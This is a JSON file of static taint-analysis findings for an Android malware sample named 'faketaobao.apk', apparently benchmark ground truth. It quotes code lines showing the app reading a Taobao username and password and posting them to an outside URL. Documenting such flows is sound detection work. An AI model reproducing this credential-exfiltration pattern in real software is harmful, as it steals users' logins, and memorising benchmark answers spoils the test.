@@ -1,0 +1,126 @@
+{
+  "fileName": "faketaobao.apk",
+  "day": "2019-09-26",
+  "findings": [
+    {
+      "source": {
+        "statement": "final String password = etPass.getText().toString();",
+        "methodName": "public void onClick(View arg0)",
+        "className": "com.tao.bao.MainActivity.AnonymousClass1",
+        "lineNo": 59,
+        "targetName": "getText",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.widget.EditText: android.text.Editable getText()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public static String postData(String url, List<NameValuePair> params)",
+        "className": "com.tao.bao.ToolHelper",
+        "lineNo": 57,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "params.add(new BasicNameValuePair(\"smscontent\", \"用户名:\" + name + \",  密码:\" + password));",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.tao.bao.MainActivity.AnonymousClass1",
+          "lineNo": 78,
+          "ID": 1
+        },
+        {
+          "statement": "Log.e(\"tag\", \"result = \" + ToolHelper.postData(\"http://www.gamefiveo.com/saves.php\", params));",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.tao.bao.MainActivity.AnonymousClass1",
+          "lineNo": 83,
+          "ID": 2
+        },
+        {
+          "statement": "httpRequest.setEntity(new UrlEncodedFormEntity(params, \"UTF-8\"));",
+          "methodName": "public static String postData(String url, List<NameValuePair> params)",
+          "className": "com.tao.bao.ToolHelper",
+          "lineNo": 56,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "collections": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads user given taobao password and sends to a remote server."
+    },
+    {
+      "source": {
+        "statement": "final String name = etName.getText().toString();",
+        "methodName": "public void onClick(View arg0)",
+        "className": "com.tao.bao.MainActivity.AnonymousClass1",
+        "lineNo": 54,
+        "targetName": "getText",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.widget.EditText: android.text.Editable getText()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public static String postData(String url, List<NameValuePair> params)",
+        "className": "com.tao.bao.ToolHelper",
+        "lineNo": 57,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "params.add(new BasicNameValuePair(\"smscontent\", \"用户名:\" + name + \",  密码:\" + password));",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.tao.bao.MainActivity.AnonymousClass1",
+          "lineNo": 78,
+          "ID": 1
+        },
+        {
+          "statement": "Log.e(\"tag\", \"result = \" + ToolHelper.postData(\"http://www.gamefiveo.com/saves.php\", params));",
+          "methodName": "public void onClick(View arg0)",
+          "className": "com.tao.bao.MainActivity.AnonymousClass1",
+          "lineNo": 83,
+          "ID": 2
+        },
+        {
+          "statement": "httpRequest.setEntity(new UrlEncodedFormEntity(params, \"UTF-8\"));",
+          "methodName": "public static String postData(String url, List<NameValuePair> params)",
+          "className": "com.tao.bao.ToolHelper",
+          "lineNo": 56,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "callbacks": true,
+        "collections": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads user given taobao username and sends to a remote server."
+    }
+  ]
+}
